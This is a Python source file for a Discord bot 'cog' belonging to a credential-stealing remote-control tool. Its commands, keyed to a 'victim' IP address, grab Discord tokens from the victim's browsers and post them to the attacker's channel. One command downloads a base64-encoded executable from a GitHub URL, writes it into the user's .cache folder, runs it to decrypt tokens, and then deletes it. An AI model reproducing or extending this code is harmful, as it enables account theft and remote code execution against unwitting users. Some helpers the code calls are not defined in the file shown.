import disnake as discord
from disnake.ext import commands
from datetime import datetime
from base64 import decodebytes

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class RawTokens(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Sends raw Discord Tokens from browsers (fast)",
        options=[bot.victim],
    )
    async def raw_tokens(self, ctx, victim):
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            
            message, tokens = "", find_token()
            for token in tokens: 
                message += token + "\n"
            if len(message) >= 1000: 
                return await ctx.followup.send("```" + message + "```")
            embed = self.bot.genEmbed( "Discord Tokens", datetime.now(), "Collected from web browsers" ).add_field(
                name="RAW Tokens:", 
                value=f"```{message.rstrip()}```"
            )
            
            await ctx.followup.send(embed=embed)

    @commands.slash_command(
        description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens",
        options=[bot.victim],
    )
    async def raw_discord(self, ctx, victim):
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            try:
                tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
                await ctx.channel.send("Status:\n> Downloaded custom decryptor")
            except Exception as e:
                return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
                
            os.chdir(nr_working)
            with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
            await ctx.channel.send("> Prepared custom decryptor")
            
            discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
            await ctx.channel.send("> Attempted to decrypt tokens from discord...")

            await ctx.followup.send(
                embed = self.bot.genEmbed(
                    "Decrypted discord tokens", 
                    datetime.now(), 
                    f"```" + str(discord_tokenz).replace("[","").replace("]","").replace(",","").replace("'","").replace('"','').replace(" ","\n\n") + "```"
                )
            )
            
            os.remove(nr_working + "\\tkr.exe")
            os.chdir(self.bot.original_dir)   
            
def setup(bot: commands.Bot):
    bot.add_cog(RawTokens(bot))